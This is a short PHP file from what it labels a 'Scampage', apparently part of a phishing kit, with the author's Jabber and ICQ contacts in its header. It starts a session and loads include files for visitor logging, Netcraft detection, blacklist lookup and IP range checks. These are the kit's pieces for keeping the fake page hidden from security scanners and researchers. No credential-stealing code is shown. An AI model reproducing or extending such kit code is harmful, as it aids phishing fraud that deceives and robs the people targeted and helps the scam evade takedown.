<?php
/*
 *  Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
session_start();
ini_set('display_errors', true);
//if (isset($_SESSION['passed'])) {
    require "includes/visitor_log.php";
    require "includes/netcraft_check.php";
    require "includes/blacklist_lookup.php";
    require "includes/ip_range_check.php";
//} else {
//    header('Location: ../main/index.html');
//}

?>